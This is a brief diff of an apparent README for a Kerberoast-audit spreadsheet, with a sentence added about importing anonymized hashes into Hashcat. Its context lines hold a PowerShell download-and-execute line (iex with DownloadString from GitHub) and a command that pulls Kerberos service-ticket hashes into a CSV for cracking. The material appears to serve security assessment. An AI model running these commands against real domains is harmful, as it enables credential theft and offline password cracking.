@@ -13,4 +13,4 @@ iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 Get-netuser -SPN | Get-DomainSPNTicket -outputformat Hashcat | Select-Object samaccountname,Hash | ConvertTo-Csv -NoTypeInformation | Select-object -skip 1 > kerberoast.csv
 ````
 
-The resulting `kerberoast.csv` file can then be imported into the Excel from this repository.
+The resulting `kerberoast.csv` file can then be imported into the Excel from this repository. The PTF column contains the anonymized Kerberoast hash, which can be imported into Hashcat for cracking.
